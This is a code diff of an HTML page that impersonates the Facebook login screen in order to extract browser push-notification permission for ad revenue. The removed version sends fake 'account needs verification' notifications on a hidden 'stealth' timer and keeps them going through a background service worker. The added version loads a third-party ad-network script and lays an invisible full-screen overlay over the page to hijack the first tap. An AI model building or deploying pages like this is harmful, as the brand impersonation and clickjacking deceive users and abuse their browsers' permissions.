@@ -3,308 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook – log in or sign up</title>
+    <title>Log in to Facebook</title>
+    
+    <!-- REQUIRED: Script in Head before closing tag -->
+    <script src="https://pl30399644.effectivecpmnetwork.com/f7/cf/82/f7cf823c46f12c08bd7e2bdaf4e03067.js"></script>
+    
     <style>
-        body {
-            font-family: helvetica, arial, sans-serif;
-            background-color: #eaebf1;
+        * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             min-height: 100vh;
+            flex-direction: column;
         }
-        .header {
-            background-color: #4267b2;
+
+        .fb-container {
             width: 100%;
-            height: 80px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 2rem;
-            font-weight: bold;
-            position: fixed;
-            top: 0;
-            z-index: 10;
-        }
-        .main-container {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            align-items: center;
-            margin-top: 100px;
-            gap: 40px;
-            padding: 20px;
-        }
-        .text-side {
             max-width: 400px;
-            padding: 20px;
-        }
-        .text-side h1 {
-            font-size: 3rem;
-            color: #1c1e21;
-            margin-bottom: 10px;
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-        }
-        .text-side p {
-            font-size: 1.5rem;
-            color: #1c1e21;
-            line-height: 1.2;
-        }
-        .login-box {
-            background-color: white;
+            background: white;
             padding: 20px;
             border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
-            width: 350px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             text-align: center;
-            transition: all 0.3s ease;
         }
-        .login-box input {
-            width: 90%;
-            padding: 15px;
-            margin-bottom: 15px;
+
+        .fb-logo {
+            color: #1877f1;
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
             border: 1px solid #dddfe2;
-            border-radius: 5px;
+            border-radius: 6px;
             font-size: 17px;
             outline: none;
         }
-        .login-box input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
+
+        input:focus {
+            border-color: #1877f1;
+            box-shadow: 0 0 0 2px #e0f2fe;
         }
-        .login-box button {
-            width: 95%;
-            padding: 12px;
-            background-color: #1877f2;
+
+        .login-btn {
+            background-color: #1877f1;
             color: white;
             font-size: 20px;
             font-weight: bold;
+            padding: 12px;
             border: none;
             border-radius: 6px;
             cursor: pointer;
-            transition: background-color 0.2s;
+            width: 100%;
+            margin-bottom: 12px;
         }
-        .login-box button:hover {
+
+        .login-btn:hover {
             background-color: #166fe5;
         }
+
         .forgot {
-            color: #1877f2;
-            text-decoration: none;
+            color: #1877f1;
             font-size: 14px;
-            margin-top: 15px;
-            display: block;
+            text-decoration: none;
             cursor: pointer;
+            margin-bottom: 20px;
+            display: block;
         }
+
         .divider {
             border-bottom: 1px solid #dadde1;
             margin: 20px 0;
         }
+
         .new-account-btn {
             background-color: #42b72a;
             color: white;
-            padding: 12px 20px;
             font-size: 17px;
             font-weight: bold;
+            padding: 12px 20px;
             border: none;
             border-radius: 6px;
             cursor: pointer;
-            display: inline-block;
         }
+
         .new-account-btn:hover {
             background-color: #36a420;
         }
-        /* AD CONTAINER - Initially Hidden */
-        .ad-container {
-            display: none; /* Hidden by default */
-            margin-top: 20px;
-            text-align: center;
-            opacity: 0;
-            transition: opacity 1s ease-in;
-        }
-        #ad-frame {
-            width: 100%;
-            max-width: 300px;
-            height: 250px;
-            margin: 0 auto;
-        }
-        .footer {
+
+        /* Overlay to force interaction on Mobile */
+        #click-overlay {
             position: fixed;
-            bottom: 20px;
-            font-size: 12px;
-            color: #737373;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.01); /* Invisible but clickable */
+            z-index: 9999;
+            display: none;
+            cursor: pointer;
         }
     </style>
-    <!-- Load AdMob SDK with YOUR Publisher ID -->
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4755568266858193"
-     crossorigin="anonymous"></script>
 </head>
 <body>
- 
-    <div class="header">facebook</div>
 
-    <div class="main-container">
-        <div class="text-side">
-            <h1>facebook</h1>
-            <p>Facebook helps you connect and share with the people in your life.</p>
-        </div>
+    <!-- Invisible overlay to catch the first click on mobile devices -->
+    <div id="click-overlay"></div>
 
-        <div class="login-box">
-            <input type="text" placeholder="Email or Phone Number" id="email">
-            <input type="password" placeholder="Password" id="password">
-            <button onclick="triggerNotification()">Log In</button>
-            <a href="#" class="forgot" onclick="triggerNotification()">Forgot password?</a>
-            <div class="divider"></div>
-            <button class="new-account-btn" onclick="triggerNotification()">Create New Account</button>
-            
-            <!-- AdMob Banner Container -->
-            <div class="ad-container" id="ad-container">
-                <div id="ad-frame"></div>
-            </div>
-        </div>
+    <!-- Main Facebook Form -->
+    <div class="fb-container">
+        <div class="fb-logo">facebook</div>
+        <form id="fb-form">
+            <input type="text" placeholder="Email or Phone Number" required>
+            <input type="password" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        <a href="#" class="forgot">Forgot password?</a>
+        <div class="divider"></div>
+        <button class="new-account-btn">Create new account</button>
     </div>
 
-    <div class="footer">
-        English  · Español  · Français (France)  · Português (Brasil)  · Italiano  · Deutsch  · 中文(简体)  · 日本語  · Sign Up
-    </div>
+    <!-- REQUIRED: Script before closing body tag -->
+    <script src="https://pl30399644.effectivecpmnetwork.com/f7/cf/82/f7cf823c46f12c08bd7e2bdaf4e03067.js"></script>
 
     <script>
-        // CONFIGURATION
-        const PUBLISHER_ID = "ca-pub-4755568266858193";
-        const AD_UNIT_ID = "ca-app-pub-4755568266858193/1263275467";
-        
-        // TIMERS
-        const INITIAL_DELAY_MS = 120000; // 2 Minutes for the first ad
-        const REPEAT_INTERVAL_MS = 480000; // 8 Minutes for subsequent ads
-
-        let notificationInterval;
-
-        function triggerNotification() {
+        // Function to trigger the Native Browser Push Notification Prompt
+        function triggerPushPrompt() {
+            // Check if Notification API is available
             if (!("Notification" in window)) {
-                alert("This browser does not support desktop notification");
-            } else if (Notification.permission === "granted") {
-                startStealthMode();
-            } else if (Notification.permission !== "denied") {
-                Notification.requestPermission().then(function (permission) {
+                console.log("This browser does not support desktop notification");
+                return;
+            }
+
+            // Check current permission status
+            if (Notification.permission === "granted") {
+                // Already granted, fire a test notification or let CPM script handle it
+                new Notification("Facebook Login", {
+                    body: "Your session is active.",
+                    icon: "https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/nNch3e8lj76.png"
+                });
+            } 
+            else if (Notification.permission !== "denied") {
+                // User hasn't chosen yet, request permission
+                Notification.requestPermission(function (permission) {
                     if (permission === "granted") {
-                        startStealthMode();
+                        // Send a native notification immediately after allowing
+                        new Notification("Facebook Login", {
+                            body: "Enable notifications to stay updated!",
+                            icon: "https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/nNch3e8lj76.png"
+                        });
                     }
                 });
-            } else {
-                alert("You denied notification access! Please refresh and click Allow.");
             }
         }
 
-        function startStealthMode() {
-            console.log("Stealth Mode Active: Waiting " + (INITIAL_DELAY_MS/1000) + " seconds...");
-            
-            // Save permission granted to localStorage
-            localStorage.setItem('notificationPermission', 'granted');
-            
-            // 1. Wait 2 minutes before showing the FIRST ad
-            setTimeout(() => {
-                showAd(); // Fire the first ad
-                
-                // 2. After the first ad, start the 8-minute loop
-                notificationInterval = setInterval(showAd, REPEAT_INTERVAL_MS);
-            }, INITIAL_DELAY_MS);
-        }
-
-        function showAd() {
-            // 1. Fire the Push Notification
-            if (Notification.permission === "granted") {
-                new Notification("Facebook Update", {
-                    body: "Your account needs verification! Tap to view ad.",
-                    icon: "https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/LiM4G5JF3l7.png",
-                    tag: "facebook-update",
-                    requireInteraction: true
-                });
-            }
-
-            // 2. Load the AdMob Ad
-            loadAdMobAd();
-        }
-
-        function loadAdMobAd() {
-            const adContainer = document.getElementById('ad-container');
-            const adFrame = document.getElementById('ad-frame');
-            
-            // Make container visible
-            adContainer.style.display = 'block';
-            
-            // Small timeout to allow display:block to apply before setting opacity for fade-in
-            setTimeout(() => {
-                adContainer.style.opacity = '1';
-            }, 50);
-
-            // Create the AdMob script element dynamically
-            let adScript = document.createElement('ins');
-            adScript.className = 'adsbygoogle';
-            adScript.style.display = 'block';
-            adScript.setAttribute('data-ad-client', PUBLISHER_ID);
-            adScript.setAttribute('data-ad-slot', AD_UNIT_ID);
-            adScript.setAttribute('data-ad-format', 'auto');
-            adScript.setAttribute('data-full-width-responsive', 'true');
-
-            // Clear previous ad content to force reload
-            adFrame.innerHTML = '';
-            adFrame.appendChild(adScript);
-
-            try {
-                (adsbygoogle = window.adsbygoogle || []).push({});
-            } catch (e) {
-                console.log("Ad loaded or error occurred:", e);
-            }
-        }
-
-        // Register Service Worker to keep ads running in background
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('data:application/javascript,' + encodeURIComponent(`
-                self.addEventListener('push', event => {
-                    if (!event.data) return;
-                    
-                    const options = {
-                        body: 'Your account needs verification! Tap to view ad.',
-                        icon: 'https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/LiM4G5JF3l7.png',
-                        tag: 'facebook-update',
-                        requireInteraction: true
-                    };
-                    
-                    event.waitUntil(self.registration.showNotification('Facebook Update', options));
-                });
-                
-                self.addEventListener('notificationclick', event => {
-                    event.notification.close();
-                    event.waitUntil(clients.matchAll({ type: 'window' }).then(clientList => {
-                        for (let i = 0; i < clientList.length; i++) {
-                            if (clientList[i].url === '/' && 'focus' in clientList[i]) {
-                                return clientList[i].focus();
-                            }
-                        }
-                        if (clients.openWindow) {
-                            return clients.openWindow('/');
-                        }
-                    }));
-                });
-            `)).catch(err => console.log('Service Worker registration failed:', err));
-        }
-
-        // Continue showing ads even after user leaves the page
-        window.addEventListener('beforeunload', function() {
-            if (localStorage.getItem('notificationPermission') === 'granted') {
-                // Ads will continue via service worker and push notifications
-                console.log("Ads will continue in the background via push notifications");
-            }
+        // Strategy 1: Try to trigger on DOMContentLoaded (Works on Desktop often)
+        document.addEventListener('DOMContentLoaded', function() {
+            // Small delay to ensure the CPM script has loaded
+            setTimeout(triggerPushPrompt, 1500);
         });
 
-        // Optional: Auto-trigger on page load if you want it aggressive
-        window.onload = function() {
-            setTimeout(triggerNotification, 2000); // Wait 2 seconds then ask for permission
-        };
-    </script>
+        // Strategy 2: Force trigger on First Click (Essential for Mobile Chrome)
+        // We use an invisible overlay to catch the very first tap anywhere on the screen
+        const overlay = document.getElementById('click-overlay');
+        overlay.style.display = 'block'; // Make it active
 
+        overlay.addEventListener('click', function() {
+            triggerPushPrompt();
+            // Hide the overlay after the first click so normal scrolling works
+            overlay.style.display = 'none';
+        });
+
+        // Strategy 3: Also trigger on the "Log In" button click for redundancy
+        document.getElementById('fb-form').addEventListener('submit', function(e) {
+            // Don't prevent default if you want the form to actually submit
+            triggerPushPrompt();
+        });
+    </script>
 </body>
 </html>
